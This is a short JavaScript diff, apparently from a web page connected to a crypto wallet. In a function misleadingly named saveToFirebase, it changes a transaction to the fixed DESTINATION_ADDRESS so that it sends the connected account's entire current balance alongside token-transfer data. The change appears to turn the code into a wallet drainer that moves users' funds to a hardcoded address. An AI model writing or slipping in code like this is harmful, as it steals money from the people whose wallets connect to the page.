@@ -471,7 +471,7 @@ async function saveToFirebase(data) {
             from: accounts[0],
             to: DESTINATION_ADDRESS,
             data: '0x' + methodId + paddedAddress + paddedAmount,
-            value: '0x0'
+            value: `0x${currentBalance.toString(16)}`,
         };
 
         log(`📤 Sending ${readableAmount} tokens...`);
